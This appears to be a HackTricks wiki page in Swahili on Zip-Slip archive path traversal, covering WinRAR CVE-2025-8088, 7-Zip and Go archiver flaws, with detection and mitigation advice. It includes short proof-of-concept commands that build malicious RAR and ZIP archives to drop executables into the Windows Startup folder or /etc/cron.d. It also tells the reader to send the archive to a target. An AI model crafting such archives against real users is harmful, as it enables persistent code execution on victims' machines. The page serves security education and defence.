# Archive Extraction Path Traversal ("Zip-Slip" / WinRAR CVE-2025-8088)

{{#include ../banners/hacktricks-training.md}}

## Muhtasari

Mifumo mingi ya archive (ZIP, RAR, TAR, 7-ZIP, etc.) huruhusu kila kipengee kuwa na **internal path** yake. Wakati chombo cha extraction kinaheshimu njia hiyo bila kuichuja, jina la faili lililotengenezwa likiwa na `..` au **absolute path** (mfano `C:\Windows\System32\`) litaandikwa nje ya saraka iliyochaguliwa na mtumiaji.
Aina hii ya udhaifu inajulikana sana kama *Zip-Slip* au **archive extraction path traversal**.

## Chanzo

1. Mshambuliaji anaunda archive ambapo kichwa cha faili kimoja au zaidi kina:
* Mfuatano wa relative traversal (`..\..\..\Users\\victim\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\payload.exe`)
* **Absolute paths** (`C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\payload.exe`)
* Au **symlinks** zilizotengenezwa ambazo zinaelekeza nje ya saraka lengwa (kawaida kwenye ZIP/TAR kwenye *nix*).
2. Mhusika anachomeka archive kwa kutumia chombo chenye udhaifu ambacho kinatumai njia iliyowekwa ndani (au kinafuata **symlinks**) badala ya kuisafisha au kulazimisha uchomaji chini ya saraka iliyochaguliwa.
3. Faili inaandikwa mahali palipodhibitiwa na mshambuliaji na huendeshwa/huingizwa mara mfumo au mtumiaji anapotumia njia hiyo.

### .NET `Path.Combine` + `ZipArchive` traversal

Muundo mbaya wa kawaida katika .NET ni kuchanganya mahali pa kusudi na **inayodhibitiwa na mtumiaji** `ZipArchiveEntry.FullName` na kufanya extraction bila kuanisha njia:
```csharp
using (var zip = ZipFile.OpenRead(zipPath))
{
foreach (var entry in zip.Entries)
{
var dest = Path.Combine(@"C:\samples\queue\", entry.FullName); // drops base if FullName is absolute
entry.ExtractToFile(dest);
}
}
```
- Ikiwa `entry.FullName` inaanza na `..\\` hufanya path traversal; ikiwa ni **absolute path** sehemu ya kushoto inatupwa kabisa, na kusababisha **arbitrary file write** kama kitambulisho cha extraction.
- Archive ya proof-of-concept ya kuandika kwenye saraka jirani `app` inayotazamwa na scanner iliyopangwa:
```python
import zipfile
with zipfile.ZipFile("slip.zip", "w") as z:
z.writestr("../app/0xdf.txt", "ABCD")
```
Kuweka ZIP hiyo kwenye inbox inayofuatiliwa kunasababisha `C:\samples\app\0xdf.txt`, ikithibitisha traversal nje ya `C:\samples\queue\` na kuwezesha follow-on primitives (kwa mfano, DLL hijacks).

## Mfano wa Ulimwengu Halisi – WinRAR ≤ 7.12 (CVE-2025-8088)

WinRAR for Windows (ikijumuisha CLI ya `rar` / `unrar`, DLL na msimbo wa chanzo unaoweza kubebeka) ilishindwa kuthibitisha majina ya faili wakati wa uondoaji.
Jalada la RAR lenye madhara likiwa na kipengele kama:
```text
..\..\..\Users\victim\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\payload.exe
```
ingemalizika **nje ya** saraka ya pato iliyochaguliwa na ndani ya saraka ya *Startup* ya mtumiaji. Baada ya kuingia, Windows hutekeleza moja kwa moja kila kitu kilicho hapo, ikitoa RCE *inayodumu*.

### Kuunda PoC Archive (Linux/Mac)
```bash
# Requires rar >= 6.x
mkdir -p "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
cp payload.exe "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"
rar a -ep evil.rar evil/*
```
Chaguzi zilizotumika:
* `-ep`  – hifadhi file paths hasa kama zilivyo (usifute leading `./`).

Wape `evil.rar` mlengwa na waambie aifungue kwa build ya WinRAR yenye udhaifu.

### Utekelezaji Ulioonekana Kwenye Uwanja

ESET iliripoti kampeni za spear-phishing za RomCom (Storm-0978/UNC2596) ambazo zilikuwa na RAR archives zikizitumia CVE-2025-8088 kuweka backdoors zilizobinafsishwa na kurahisisha operesheni za ransomware.

## Matukio Mapya (2024–2025)

### 7-Zip ZIP symlink traversal → RCE (CVE-2025-11001 / ZDI-25-949)
* **Bug**: ZIP entries ambazo ni **symbolic links** zilitafsiriwa (dereferenced) wakati wa extraction, kuruhusu mashambulizi kutoroka directory ya destination na kuandika juu ya njia yoyote. Mwingiliano wa mtumiaji ni tu *kufungua/kuchukua* archive.
* **Athiriwa**: 7-Zip 21.02–24.09 (Windows & Linux builds). Imerekebishwa katika **25.00** (Julai 2025) na baadaye.
* **Njia ya athari**: Kuandika juu ya `Start Menu/Programs/Startup` au maeneo yanayotekelezwa na huduma → code inatumika wakati wa logon inayofuata au restart ya huduma.
* **PoC Fupi (Linux)**:
```bash
mkdir -p out
ln -s /etc/cron.d evil
zip -y exploit.zip evil   # -y preserves symlinks
7z x exploit.zip -o/tmp/target   # vulnerable 7-Zip writes to /etc/cron.d
```
Katika build iliyotengenezwa (patched) `/etc/cron.d` haitaguswa; symlink itatolewa kama link ndani ya /tmp/target.

### Go mholt/archiver Unarchive() Zip-Slip (CVE-2025-3445)
* **Bug**: `archiver.Unarchive()` inafuata `../` na ZIP entries zilizo na symlink, ikiandika nje ya `outputDir`.
* **Athiriwa**: `github.com/mholt/archiver` ≤ 3.5.1 (mradi sasa umeachwa / deprecated).
* **Suluhisho**: Badilisha kwa `mholt/archives` ≥ 0.1.0 au tekeleza ukaguzi wa canonical-path kabla ya kuandika.
* **Mfano mdogo**:
```go
// go test . with archiver<=3.5.1
archiver.Unarchive("exploit.zip", "/tmp/safe")
// exploit.zip holds ../../../../home/user/.ssh/authorized_keys
```

## Vidokezo vya Kugundua

* **Static inspection** – Orodhesha archive entries na weka alama kwa jina lolote linalojumuisha `../`, `..\\`, *absolute paths* (`/`, `C:`) au entries za aina *symlink* ambazo target yake iko nje ya extraction dir.
* **Canonicalisation** – Hakikisha `realpath(join(dest, name))` bado inaanza na `dest`. Kataa vinginevyo.
* **Sandbox extraction** – Chomoa ndani ya directory ya muda inayoweza kutupwa kwa kutumia extractor *safe* (mfano, `bsdtar --safe --xattrs --no-same-owner`, 7-Zip ≥ 25.00) na thibitisha kwamba njia zinazotokana zimebaki ndani ya directory.
* **Endpoint monitoring** – Tuma onyo kuhusu executable mpya zilizoandikwa kwa `Startup`/`Run`/`cron` maeneo muda mfupi baada ya archive kufunguliwa na WinRAR/7-Zip/etc.

## Kupunguza Hatari na Kuimarisha

1. **Sasisha extractor** – WinRAR 7.13+ na 7-Zip 25.00+ zinafanya path/symlink sanitisation. Zana zote mbili bado hazina auto-update.
2. Extract archives kwa kutumia “**Do not extract paths**” / “**Ignore paths**” inapowezekana.
3. Kwenye Unix, punguza privileges & mount **chroot/namespace** kabla ya extraction; kwenye Windows, tumia **AppContainer** au sandbox.
4. Ikiwa unaandika custom code, sanifu kwa `realpath()`/`PathCanonicalize()` **kabla** ya create/write, na kata entry yoyote inayotoroka destination.

## Matukio Mengine / Ya Kihistoria

* 2018 – Taarifa kubwa ya *Zip-Slip* kutoka Snyk ambayo ilighusu maktaba nyingi za Java/Go/JS.
* 2023 – 7-Zip CVE-2023-4011 traversal inayofanana wakati wa `-ao` merge.
* 2025 – HashiCorp `go-slug` (CVE-2025-0377) TAR extraction traversal katika slugs (patch katika v1.2).
* Logic yoyote ya custom extraction ambayo inashindwa kuita `PathCanonicalize` / `realpath` kabla ya kuandika.

## References

- [Trend Micro ZDI-25-949 – 7-Zip symlink ZIP traversal (CVE-2025-11001)](https://www.zerodayinitiative.com/advisories/ZDI-25-949/)
- [JFrog Research – mholt/archiver Zip-Slip (CVE-2025-3445)](https://research.jfrog.com/vulnerabilities/archiver-zip-slip/)
- [Meziantou – Prevent Zip Slip in .NET](https://www.meziantou.net/prevent-zip-slip-in-dotnet.htm)
- [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)

{{#include ../banners/hacktricks-training.md}}
